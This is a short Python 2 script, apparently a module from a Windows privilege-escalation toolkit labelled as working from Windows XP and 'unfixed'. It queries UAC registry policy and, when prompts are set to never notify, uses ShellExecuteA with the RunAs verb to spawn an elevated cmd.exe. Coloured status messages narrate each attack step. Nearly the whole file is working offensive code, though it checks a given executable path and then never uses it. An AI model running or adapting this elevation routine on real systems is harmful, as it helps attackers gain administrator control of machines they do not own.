"""
Works from: Windows XP
Fixed in: unfixed
"""
import os
import ctypes
import _winreg
from colorama import init, Fore
init(convert=True)

def successBox():
	return (Fore.GREEN + '[+]' + Fore.RESET)
	
def errorBox():
	return (Fore.RED + '[-]' + Fore.RESET)

def infoBox():
	return (Fore.CYAN + '[!]' + Fore.RESET)	
	
def warningBox():
	return (Fore.YELLOW + '[!]' + Fore.RESET)

def uac_status():
	hKey = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,
							"Software\Microsoft\Windows\CurrentVersion\Policies\System")
					
	ConsentPromptBehaviorAdmin = _winreg.QueryValueEx(hKey,"ConsentPromptBehaviorAdmin")							
	ConsentPromptBehaviorUser = _winreg.QueryValueEx(hKey,"ConsentPromptBehaviorUser")
													
	if (ConsentPromptBehaviorAdmin[0] == 0) and (ConsentPromptBehaviorUser[0] == 3):
		return True
	else:
		return False

def runas(exe_path):
	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
		print " {} runas: We are already running as administrator, cannot proceed".format(errorBox())
		return False
	else:
		print " {} runas: We are not administrator, attempting to elevate process with RunAs".format(infoBox())
		print " {} runas: Attempting to find given executable path on disk".format(infoBox())
		if (os.path.isfile(os.path.join(exe_path)) == True):
				print " {} runas: Successfully found given executable path on disk".format(successBox())
				print " {} runas: Attempting to identify UAC level".format(infoBox())
				if (uac_status() == True):
					print " {} runas: UAC level is set to Never Notify".format(successBox())
					try:
						ctypes.windll.Shell32.ShellExecuteA(None,"RunAs","cmd.exe",None,None,1)
						print " {} runas: Successfully elevated our process with RunAs".format(successBox())
					except Exception as error:
						print " {} runas: Unable to elevate our process with RunAs".format(errorBox())
						return False
				else:
					print " {} runas: UAC level is to high, cannot proceed".format(errorBox())
					return False
		else:
			print " {} runas: Given executable path is not found on disk".format(errorBox())
			return False